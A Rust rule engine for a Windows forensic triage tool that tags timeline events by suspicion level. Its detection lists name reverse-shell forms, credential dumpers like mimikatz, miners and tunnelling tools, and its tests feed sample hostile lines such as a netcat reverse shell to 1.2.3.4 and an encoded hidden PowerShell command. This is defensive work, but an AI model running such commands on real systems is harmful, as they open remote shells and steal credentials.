//! 可疑标记引擎：对全部时间线事件统一应用规则，产出红/黄/灰标记与命中统计。
//! M3 生效的规则基于已接入模块；R-007（4648）等待 M4 事件源接入。

use crate::model::{ActivityEvent, RuleInfo, Sev, Tag};

pub const LOLBAS: &[&str] = &[
    "certutil", "mshta", "rundll32", "regsvr32", "wscript", "cscript", "bitsadmin", "msxsl",
    "installutil", "msbuild", "wmic", "pcalua", "forfiles", "hh", "msdt", "cmstp", "odbcconf",
    "diskshadow",
];

/// 挖矿特征关键词（R-026）
pub const MINING_SIGS: &[&str] = &[
    "stratum+tcp", "stratum+ssl", "xmrig", "minerd", "cpuminer", "--donate-level",
];

/// 反弹 Shell 特征（R-027）
pub const REVSHELL_SIGS: &[&str] = &[
    "/dev/tcp/", "nc -e", "ncat -e", "bash -i >&", "socat exec:", "powercat -c",
];

/// 隧道/内网穿透工具特征（R-028）
pub const TUNNEL_SIGS: &[&str] = &[
    "frpc", "frps", "ngrok", "chisel", "earthworm", "regeorg", "iox", "sniper",
];

/// 凭据抓取工具特征（R-029）
pub const CREDDUMP_SIGS: &[&str] = &[
    "mimikatz", "sekurlsa", "lazagne", "pwdump", "quarks-pwdump", "mimipenguin", "lsass.dmp",
];

pub fn is_public_dir(p: &str) -> bool {
    p.to_ascii_lowercase().contains(r"c:\users\public")
}

pub fn is_temp_dir(p: &str) -> bool {
    let l = p.to_ascii_lowercase();
    l.contains(r"\appdata\local\temp\") || l.contains(r"c:\windows\temp\") || l.contains(r"\temp\")
}

/// 用户可写、正常软件极少落盘的目录（攻击者常用落盘点）
pub fn is_programdata(p: &str) -> bool {
    let l = p.to_ascii_lowercase();
    l.contains(r"c:\programdata") || l.contains(r"c:\perflogs")
}

pub fn is_lolbas(p: &str) -> bool {
    let base = p.rsplit(['\\', '/']).next().unwrap_or(p).to_ascii_lowercase();
    // 精确名匹配：starts_with 会把 certutilX.exe 这类误报进来
    LOLBAS.iter().any(|l| base == *l || base == format!("{l}.exe"))
}

/// 直接可执行/脚本扩展。落点规则（R-004/R-006）打标门控：
/// .lnk 快捷方式（公共桌面大量存在）等非可执行文件不构成"目录里执行了程序"
pub fn is_executable_file(p: &str) -> bool {
    let l = p.to_ascii_lowercase();
    [
        ".exe", ".dll", ".scr", ".sys", ".com", ".pif", ".cpl", ".hta", ".bat", ".cmd",
        ".ps1", ".vbs", ".js", ".jse", ".wsf", ".jar", ".msi",
    ]
    .iter()
    .any(|e| l.ends_with(e))
}

pub fn cmdline_suspicious(s: &str) -> Option<&'static str> {
    let l = s.to_ascii_lowercase();
    let table = [
        ("-encodedcommand", "R-003"),
        ("-enc ", "R-003"),
        ("frombase64string", "R-003"),
        ("invoke-expression", "R-003"),
        ("iex ", "R-003"),
        // 隐藏窗口执行（无文件落地的常见形态）
        ("-w hidden", "R-003"),
        ("-window hidden", "R-003"),
        ("-windowstyle hidden", "R-003"),
        ("vbscript:", "R-003"),
        ("mshta http", "R-003"),
        ("downloadstring", "R-002"),
        ("-urlcache", "R-002"),
        ("bitsadmin /transfer", "R-002"),
        // certutil 解码/远程取文件（下载器两板斧）
        ("certutil -decode", "R-002"),
        ("certutil -verifyctl", "R-002"),
    ];
    table
        .iter()
        .find(|(pat, _)| l.contains(pat))
        .map(|(_, rid)| *rid)
}

/// 从登录事件 info（"… · 源 {ip} · …"）提取源 IP
pub fn extract_login_ip(info: &str) -> Option<String> {
    const MARK: &str = "源 ";
    let i = info.find(MARK)?;
    let rest = &info[i + MARK.len()..];
    let end = rest.find(" ·").unwrap_or(rest.len());
    let ip = &rest[..end];
    (!ip.is_empty() && ip != "-" && ip != "::1" && ip != "127.0.0.1").then(|| ip.to_string())
}

/// IPv4/IPv6 是否公网地址（私网/环回/链路本地/组播不算）
pub fn is_public_ip(ip: &str) -> bool {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() == 4 && parts.iter().all(|p| p.parse::<u8>().is_ok()) {
        let o: Vec<u8> = parts.iter().map(|p| p.parse().unwrap()).collect();
        return !matches!(
            (o[0], o[1]),
            (10, _)                       // 10/8
                | (172, 16..=31)          // 172.16/12
                | (192, 168)              // 192.168/16
                | (127, _)                // loopback
                | (169, 254)              // link-local
                | (0, _)                  // this-network
                | (224..=239, _)          // multicast
                | (255, 255)              // broadcast
        );
    }
    // IPv6：站点本地/链路本地/ULA/环回不算公网
    let l = ip.to_ascii_lowercase();
    !l.starts_with("fe80:") && !l.starts_with("fc") && !l.starts_with("fd") && !l.starts_with("::")
}

/// 交互类登录是否发生在凌晨（本地 00:00–06:00）。
/// 只看凌晨不看周末：个人机周末使用是常态（实测一次就贡献 75 条误报），
/// 服务器场景的异常时段由"凌晨 + 公网源"（R-024）组合补强
pub fn is_off_hours(time: &str) -> bool {
    use chrono::Timelike;
    // "YYYY-MM-DD HH:MM:SS.mmm"
    let Ok(dt) = chrono::NaiveDateTime::parse_from_str(&time[..16.min(time.len())], "%Y-%m-%d %H:%M") else {
        return false;
    };
    dt.hour() < 6
}

/// 事件是否交互类登录（服务/批处理登录凌晨跑备份是常态，不算）
pub fn is_interactive_logon(ev: &ActivityEvent) -> bool {
    match ev.kind.as_str() {
        "用户登录（会话）" | "会话重连（RDP）" => true,
        "登录成功" => ev.info.contains("交互登录") || ev.info.contains("RDP") || ev.info.contains("解锁"),
        _ => false,
    }
}

fn is_exec_kind(k: &str) -> bool {
    // 前缀匹配：各模块实际产出 "程序运行（逐次）/程序运行记录/进程创建（逐次）"
    // 等变体，精确匹配曾让 Prefetch/MUICache/4688 三大证据源整体漏标
    const PREFIXES: &[&str] = &[
        "程序运行",
        "程序执行",
        "程序首次执行",
        "程序最后执行",
        "UWP应用",
        "进程创建",
        "新服务安装",
        "Sysmon 进程创建",
    ];
    PREFIXES.iter().any(|p| k.starts_with(p))
}

const RULES: &[(&str, Sev, &str, &str)] = &[
    ("R-001", Sev::Red, "服务指向非常规路径", "新安装服务的映像位于 TEMP/Public 或脚本扩展名"),
    ("R-002", Sev::Red, "下载执行类参数", "-urlcache / DownloadString / bitsadmin /transfer"),
    ("R-003", Sev::Red, "混淆执行参数", "-enc / -encodedcommand / FromBase64String / IEX"),
    ("R-004", Sev::Yellow, "可写目录执行", "程序路径位于 TEMP/AppData 临时目录"),
    ("R-005", Sev::Yellow, "LOLBAS 程序执行", "certutil/mshta/rundll32/regsvr32/wscript/bitsadmin 等出现执行痕迹"),
    ("R-006", Sev::Red, "公共目录可执行文件", "执行痕迹路径位于 C:\\Users\\Public"),
    ("R-007", Sev::Yellow, "显式凭据登录", "4648 事件（横向移动征兆）"),
    ("R-008", Sev::Red, "日志被清空", "Security 1102 / System 104"),
    ("R-009", Sev::Gray, "证据缺失提示", "Prefetch 禁用/权限不足导致模块无数据"),
    ("R-010", Sev::Red, "自启动项异常", "Run/启动文件夹/Winlogon 指向临时/公共目录或 LOLBAS"),
    ("R-011", Sev::Red, "服务映像异常", "服务 ImagePath 位于临时/公共目录或 LOLBAS/脚本解释器"),
    ("R-012", Sev::Yellow, "计划任务异常", "任务命令指向临时/公共目录或 LOLBAS"),
    ("R-013", Sev::Red, "隐藏/克隆账号", "SAM 中发现 $ 尾隐藏账号或 RID 克隆（M5b 接入）"),
    ("R-014", Sev::Red, "WMI 可疑订阅", "非默认的命令行/脚本事件消费者（无文件持久化）"),
    ("R-015", Sev::Yellow, "孤儿配置目录", "C:\\Users 下无同名账户的配置目录（账户可能已被删除）"),
    ("R-016", Sev::Red, "疑似暴力破解", "同一源对同一账户登录失败 ≥5 次（4625 聚合）"),
    ("R-017", Sev::Yellow, "ProgramData 持久化", "自启动/服务/任务指向 ProgramData、Perflogs 等用户可写目录"),
    ("R-018", Sev::Red, "Defender 防护异常", "实时保护被关闭、检出告警或排除项（1116/5001/5013/注册表）"),
    ("R-019", Sev::Red, "持久化劫持", "IFEO Debugger / AppInit_DLLs / LSA 包 / 屏保被植入"),
    ("R-020", Sev::Yellow, "非微软任务注册", "TaskScheduler 日志中出现非 Microsoft 命名空间的任务注册/更新"),
    ("R-021", Sev::Yellow, "近期落盘可执行文件", "ProgramData/Public/Temp 等可写目录近 N 天新增的可执行文件"),
    ("R-022", Sev::Yellow, "hosts 文件异常条目", "hosts 中存在非默认的解析映射（流量劫持/免杀域名常见手法）"),
    ("R-023", Sev::Yellow, "凌晨交互登录", "00:00-06:00 的交互/RDP/会话登录（个人机周末使用是常态，不看周末；结合源 IP 判断）"),
    ("R-024", Sev::Yellow, "公网源远程登录", "登录成功/会话重连的源地址为公网 IP（正常运维极少来自公网）"),
    ("R-025", Sev::Yellow, "账户加入管理员组", "4732/4728 将账户加入 Administrators 组（提权痕迹，需人工确认）"),
    ("R-026", Sev::Red, "挖矿相关特征", "stratum+tcp/xmrig/minerd/cpuminer 等出现于命令行或执行痕迹"),
    ("R-027", Sev::Red, "反弹Shell特征", "/dev/tcp/、nc -e、bash -i >&、socat exec 等反向连接命令形态"),
    ("R-028", Sev::Yellow, "隧道/穿透工具特征", "frpc/ngrok/chisel/earthworm/regeorg 等内网穿透工具痕迹"),
    ("R-029", Sev::Red, "凭据抓取工具", "mimikatz/sekurlsa/lazagne/pwdump/lsass转储 等凭据窃取痕迹"),
    ("R-030", Sev::Red, "暴力破解后登录成功", "同源同账户 ≥5 次登录失败后 10 分钟内出现登录成功——口令疑似被攻破"),
];

fn rule_name(rid: &str) -> &'static str {
    RULES.iter().find(|r| r.0 == rid).map(|r| r.2).unwrap_or("")
}

/// 对事件统一应用规则；返回各规则命中统计（与 RULES 同序）
pub fn apply_rules(events: &mut [ActivityEvent]) -> Vec<RuleInfo> {
    for ev in events.iter_mut() {
        let mut tags: Vec<(Sev, &str)> = Vec::new();
        let hay = format!("{} {}", ev.desc, ev.info);
        if let Some(rid) = cmdline_suspicious(&hay) {
            tags.push((Sev::Red, rid));
        }
        if ev.kind == "日志清空" {
            tags.push((Sev::Red, "R-008"));
        }
        if ev.kind == "显式凭据登录" {
            tags.push((Sev::Yellow, "R-007"));
        }
        if ev.kind == "新服务安装" && (is_temp_dir(&hay) || is_public_dir(&hay)) {
            tags.push((Sev::Red, "R-001"));
        }
        // ---- M5 持久化排查 ----
        let hay_l = hay.to_ascii_lowercase();
        let interp = hay_l.contains("powershell") || hay_l.contains("cmd.exe") || hay_l.contains("wscript") || hay_l.contains("mshta");
        match ev.kind.as_str() {
            "自启动项" => {
                if is_public_dir(&hay) || is_temp_dir(&hay) || is_lolbas(&hay) || interp {
                    tags.push((Sev::Red, "R-010"));
                } else if is_programdata(&hay) {
                    tags.push((Sev::Yellow, "R-017"));
                }
            }
            "系统服务" => {
                if is_public_dir(&hay) || is_temp_dir(&hay) || is_lolbas(&hay) || interp {
                    tags.push((Sev::Red, "R-011"));
                } else if is_programdata(&hay) {
                    tags.push((Sev::Yellow, "R-017"));
                }
            }
            "计划任务" => {
                if is_public_dir(&hay) || is_temp_dir(&hay) || is_lolbas(&hay) {
                    tags.push((Sev::Yellow, "R-012"));
                } else if interp {
                    // 脚本解释器执行任务（powershell/cmd/wscript/mshta）——
                    // 与自启动/服务同口径（此前任务漏了解释器检查）
                    tags.push((Sev::Yellow, "R-012"));
                } else if is_programdata(&hay) {
                    tags.push((Sev::Yellow, "R-017"));
                }
            }
            _ => {}
        }
        if is_exec_kind(&ev.kind) {
            if is_public_dir(&ev.desc) && is_executable_file(&ev.desc) {
                tags.push((Sev::Red, "R-006"));
            } else if is_temp_dir(&ev.desc) && is_executable_file(&ev.desc) {
                tags.push((Sev::Yellow, "R-004"));
            }
            if is_lolbas(&ev.desc) {
                tags.push((Sev::Yellow, "R-005"));
            }
        }
        // ---- 登录类规则 ----
        if is_interactive_logon(ev) && ev.time.len() >= 16 && is_off_hours(&ev.time) {
            tags.push((Sev::Yellow, "R-023"));
        }
        if (ev.kind == "登录成功" || ev.kind == "会话重连（RDP）") {
            if let Some(ip) = extract_login_ip(&ev.info) {
                if is_public_ip(&ip) {
                    tags.push((Sev::Yellow, "R-024"));
                }
            }
        }
        // 账户被加入管理员组（4732/4728）
        if ev.kind == "账户管理"
            && ev.desc.starts_with("加入")
            && {
                let l = hay.to_ascii_lowercase();
                l.contains("administrators") || l.contains("管理员")
            }
        {
            tags.push((Sev::Yellow, "R-025"));
        }
        // ---- 攻击工具特征关键词（全事件扫描） ----
        if MINING_SIGS.iter().any(|s| hay_l.contains(s)) {
            tags.push((Sev::Red, "R-026"));
        }
        if REVSHELL_SIGS.iter().any(|s| hay_l.contains(s)) {
            tags.push((Sev::Red, "R-027"));
        }
        if TUNNEL_SIGS.iter().any(|s| hay_l.contains(s)) {
            tags.push((Sev::Yellow, "R-028"));
        }
        if CREDDUMP_SIGS.iter().any(|s| hay_l.contains(s)) {
            tags.push((Sev::Red, "R-029"));
        }
        for (sev, rid) in tags {
            ev.tags.push(Tag {
                sev,
                text: format!("{rid} {}", rule_name(rid)),
            });
        }
        if !ev.tags.is_empty() {
            ev.sev = ev.tags.iter().map(|t| t.sev).max().unwrap();
        }
    }
    // 命中统计按最终标签扫描（含各模块预打的标签，如 R-009/R-014）
    let mut hits = vec![0usize; RULES.len()];
    for ev in events.iter() {
        for t in &ev.tags {
            if let Some(i) = RULES.iter().position(|r| t.text.starts_with(r.0)) {
                hits[i] += 1;
            }
        }
    }
    RULES
        .iter()
        .enumerate()
        .map(|(i, r)| RuleInfo {
            id: r.0.into(),
            sev: r.1,
            name: r.2.into(),
            detail: r.3.into(),
            hits: hits[i],
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::ActivityEvent;

    fn ev(kind: &str, desc: &str, info: &str) -> ActivityEvent {
        ActivityEvent::plain(
            "2026-09-22 10:00:00.000".into(),
            kind,
            desc.into(),
            info.into(),
            "T",
        )
    }

    #[test]
    fn flags_temp_service_install_red() {
        let mut es = vec![ev(
            "新服务安装",
            "安装新服务：\"x\"",
            "C:\\Users\\Public\\s.exe · 自动 · LocalSystem",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Red);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-001")));
    }

    #[test]
    fn flags_lolbas_yellow() {
        let mut es = vec![ev("程序运行", "C:\\Windows\\System32\\certutil.exe", "")];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Yellow);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-005")));
    }

    #[test]
    fn flags_log_clear_red() {
        let mut es = vec![ev("日志清空", "System 事件日志被清除", "")];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Red);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-008")));
    }

    #[test]
    fn flags_enc_param_red() {
        let mut es = vec![ev(
            "程序运行",
            "powershell.exe",
            "-nop -w hidden -enc SQBFAFgA",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Red);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-003")));
    }

    #[test]
    fn flags_temp_exec_yellow_and_public_red() {
        let mut es = vec![
            ev("程序运行", r"C:\Users\h\AppData\Local\Temp\svc.exe", ""),
            ev("程序首次执行", r"C:\Users\Public\payload.exe", ""),
        ];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Yellow); // TEMP → R-004
        assert_eq!(es[1].sev, Sev::Red); // Public → R-006
    }

    #[test]
    fn normal_doc_not_flagged() {
        let mut es = vec![ev("打开文档", "报告.docx", "")];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::None);
        assert!(es[0].tags.is_empty());
    }

    #[test]
    fn hits_counted() {
        let mut es = vec![
            ev("日志清空", "x", ""),
            ev("日志清空", "y", ""),
        ];
        let rules = apply_rules(&mut es);
        let r8 = rules.iter().find(|r| r.id == "R-008").unwrap();
        assert_eq!(r8.hits, 2);
    }

    #[test]
    fn flags_autostart_persistence_red() {
        let mut es = vec![ev(
            "自启动项",
            "HKLM Run：Updater",
            r"C:\Users\Public\svc.exe · 键最后写入时间",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Red);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-010")));
    }

    #[test]
    fn normal_run_entry_not_flagged() {
        let mut es = vec![ev(
            "自启动项",
            "用户 Run：OneDrive",
            r"C:\Program Files\Microsoft OneDrive\OneDrive.exe · 键最后写入时间",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::None);
        assert!(es[0].tags.is_empty());
    }

    #[test]
    fn flags_service_temp_image_red() {
        let mut es = vec![ev(
            "系统服务",
            "服务_badsvc（自动）",
            r"C:\Users\x\AppData\Local\Temp\badsvc.exe · 应用程序服务 · 键最后写入时间",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Red);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-011")));
    }

    #[test]
    fn flags_scheduled_task_yellow() {
        let mut es = vec![ev(
            "计划任务",
            "任务 \\OfficeUpdater",
            r"C:\Users\Public\updater.exe /x · 任务注册时间",
        )];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Yellow);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-012")));
    }

    #[test]
    fn interpreters_in_persistence_flagged() {
        let mut es = vec![
            ev("自启动项", "HKLM Run：x", "mshta javascript:... · 键最后写入时间"),
            ev("系统服务", "服务 x（自动）", "powershell -f x.ps1 · 键最后写入时间"),
        ];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-010")));
        assert!(es[1].tags.iter().any(|t| t.text.contains("R-011")));
    }

    #[test]
    fn pre_tagged_module_hits_counted() {
        // 模块预打的标签（如 WMI R-014）也应计入规则命中统计
        let mut e = ev("WMI事件订阅", "CommandLineEventConsumer：evil", "cmd /c x");
        e.tags.push(Tag {
            sev: Sev::Red,
            text: "R-014 WMI 可疑订阅".into(),
        });
        let rules = apply_rules(&mut [e]);
        let r14 = rules.iter().find(|r| r.id == "R-014").unwrap();
        assert_eq!(r14.hits, 1);
    }

    #[test]
    fn exec_kind_prefix_covers_all_module_variants() {
        // Prefetch/MUICache/4688 的 kind 变体必须全部命中执行类规则
        for kind in [
            "程序运行",
            "程序运行（逐次）",
            "程序运行记录",
            "程序执行痕迹",
            "程序首次执行",
            "程序最后执行",
            "UWP应用痕迹",
            "进程创建（逐次）",
            "新服务安装",
        ] {
            let mut es = vec![ev(kind, r"C:\Users\Public\payload.exe", "")];
            apply_rules(&mut es);
            assert!(
                es[0].tags.iter().any(|t| t.text.contains("R-006")),
                "kind={kind} 应命中 R-006"
            );
        }
    }

    #[test]
    fn prefetch_lolbas_now_flagged() {
        // 审计回归：Prefetch 的 "程序运行（逐次）" 此前漏标 R-005
        let mut es = vec![ev("程序运行（逐次）", r"C:\Windows\System32\certutil.exe", "总运行 3 次")];
        apply_rules(&mut es);
        assert_eq!(es[0].sev, Sev::Yellow);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-005")));
    }

    #[test]
    fn programdata_persistence_flagged_yellow() {
        let mut es = vec![ev(
            "自启动项",
            "HKLM Run：Updater",
            r"C:\ProgramData\svc\svc.exe · 键最后写入时间",
        )];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-017")));
        assert_eq!(es[0].sev, Sev::Yellow);
    }

    #[test]
    fn temp_autostart_still_red_not_downgraded() {
        let mut es = vec![ev(
            "系统服务",
            "服务 x（自动）",
            r"C:\Users\p\AppData\Local\Temp\x.exe · 键最后写入时间",
        )];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-011")));
        assert_eq!(es[0].sev, Sev::Red);
    }

    #[test]
    fn public_desktop_shortcut_not_flagged() {
        // 误报治理回归：公共桌面 .lnk（每台机器都有）不再触发 R-006
        let mut es = vec![ev(
            "程序运行",
            r"C:\Users\Public\Desktop\VMware Workstation Pro.lnk",
            "",
        )];
        apply_rules(&mut es);
        assert!(es[0].tags.is_empty(), "{:?}", es[0].tags);
        // 同目录真实可执行文件仍标红
        let mut es2 = vec![ev("程序运行", r"C:\Users\Public\svc.exe", "")];
        apply_rules(&mut es2);
        assert!(es2[0].tags.iter().any(|t| t.text.contains("R-006")));
    }

    #[test]
    fn lolbas_exact_name_only() {
        // starts_with 会把 certutilX.exe 误报；大小写不敏感保留
        assert!(is_lolbas(r"C:\Windows\System32\CERTUTIL.EXE"));
        assert!(is_lolbas("mshta.exe"));
        assert!(!is_lolbas("certutilx.exe"));
        assert!(!is_lolbas("msbuildhelper.exe"));
    }

    #[test]
    fn executable_file_gate() {
        assert!(is_executable_file(r"C:\x\svc.EXE"));
        assert!(is_executable_file("payload.ps1"));
        assert!(!is_executable_file("readme.txt"));
        assert!(!is_executable_file(r"C:\Users\Public\Desktop\Edge.lnk"));
    }

    #[test]
    fn attack_tool_signatures() {
        // 挖矿 / 反弹Shell / 隧道 / 凭据抓取（R-026~R-029）
        let mut es = vec![
            ev("进程创建（逐次）", r"C:\x\a.exe", r"xmrig -o stratum+tcp://pool.x:3333"),
            ev("程序运行", r"C:\Windows\System32\cmd.exe", r"cmd /c nc -e /bin/bash 1.2.3.4 4444"),
            ev("程序首次执行", r"C:\Users\Public\frpc.exe", "frpc -c frpc.ini"),
            ev("程序运行", r"C:\temp\mimikatz.exe", "sekurlsa::logonpasswords"),
        ];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-026")), "{:?}", es[0].tags);
        assert!(es[1].tags.iter().any(|t| t.text.contains("R-027")));
        assert!(es[2].tags.iter().any(|t| t.text.contains("R-028")));
        assert!(es[3].tags.iter().any(|t| t.text.contains("R-029")));
        // 正常内容不命中
        let mut clean = vec![ev("程序运行", r"C:\Program Files\App\app.exe", "正常参数")];
        apply_rules(&mut clean);
        assert!(clean[0].tags.is_empty(), "{:?}", clean[0].tags);
    }

    #[test]
    fn off_hours_and_public_ip_logon() {
        // 2026-09-26 是周六；凌晨交互登录 → R-023（只看凌晨不看周末）
        let mut e1 = ev(
            "登录成功",
            "账户 CORP\\u 登录成功",
            "类型 10（RDP 远程登录）· 源 192.168.1.5 · Security 4624",
        );
        e1.time = "2026-09-26 03:00:00.000".into();
        // 周末白天（22:08）→ 不再触发（实测个人机周末使用是常态）
        let mut e1b = ev(
            "会话登录",
            "会话登录：CORP\\u",
            "源 192.168.1.5 · TS-LocalSessionManager 21",
        );
        e1b.time = "2026-09-27 22:08:48.073".into();
        // 工作日白天 + 私网源 → 无标记
        let mut e2 = ev(
            "登录成功",
            "账户 CORP\\u 登录成功",
            "类型 2（交互登录）· 源 192.168.1.5 · Security 4624",
        );
        e2.time = "2026-09-28 10:00:00.000".into();
        // 工作日白天 + 公网源 → R-024
        let mut e3 = ev(
            "登录成功",
            "账户 admin 登录成功",
            "类型 10（RDP 远程登录）· 源 203.0.113.7 · Security 4624",
        );
        e3.time = "2026-09-28 10:00:00.000".into();
        // 凌晨服务登录（类型 5）不触发 R-023
        let mut e4 = ev(
            "登录成功",
            "账户 Svc 登录成功",
            "类型 5（服务）· 源 - · Security 4624",
        );
        e4.time = "2026-09-28 03:00:00.000".into();
        let mut arr = [e1, e1b, e2, e3, e4];
        apply_rules(&mut arr);
        let [e1, e1b, e2, e3, e4] = arr;
        assert!(e1.tags.iter().any(|t| t.text.contains("R-023")), "{:?}", e1.tags);
        assert!(e1b.tags.is_empty(), "周末白天登录不应触发 R-023：{:?}", e1b.tags);
        assert!(e2.tags.is_empty(), "{:?}", e2.tags);
        assert!(e3.tags.iter().any(|t| t.text.contains("R-024")));
        assert!(e4.tags.is_empty(), "服务登录不应触发 R-023：{:?}", e4.tags);
        // 单元函数
        assert!(is_public_ip("203.0.113.7"));
        assert!(!is_public_ip("192.168.1.5"));
        assert!(!is_public_ip("10.1.2.3"));
        assert!(!is_public_ip("172.20.1.1"));
        assert!(!is_public_ip("fe80::1"));
        assert_eq!(
            extract_login_ip("类型 10（RDP 远程登录）· 源 203.0.113.7 · Security 4624").as_deref(),
            Some("203.0.113.7")
        );
    }

    #[test]
    fn admin_group_add_flagged() {
        let mut es = vec![ev(
            "账户管理",
            "加入本地组 Administrators：CORP\\backdoor",
            "操作者 admin · Security 4732",
        )];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-025")), "{:?}", es[0].tags);
        // 普通组不触发
        let mut es2 = vec![ev("账户管理", "加入本地组 Users：CORP\\u1", "操作者 admin · Security 4732")];
        apply_rules(&mut es2);
        assert!(es2[0].tags.is_empty());
    }

    #[test]
    fn hidden_window_and_task_interpreter() {
        // R-003 扩充：隐藏窗口执行
        let mut es = vec![ev("程序运行", "powershell.exe", "-w hidden -nop -c IEX(x)")];
        apply_rules(&mut es);
        assert!(es[0].tags.iter().any(|t| t.text.contains("R-003")));
        // R-012 优化：任务命令用解释器执行
        let mut es2 = vec![ev("计划任务", r"任务 \T1", r"powershell -File C:\normal\upd.ps1 · 任务注册时间")];
        apply_rules(&mut es2);
        assert!(es2[0].tags.iter().any(|t| t.text.contains("R-012")), "{:?}", es2[0].tags);
        // LOLBAS 扩充
        assert!(is_lolbas("wmic.exe"));
        assert!(is_lolbas(r"C:\Windows\System32\msdt.exe"));
        assert!(!is_lolbas("wmicplayer.exe"));
    }
}
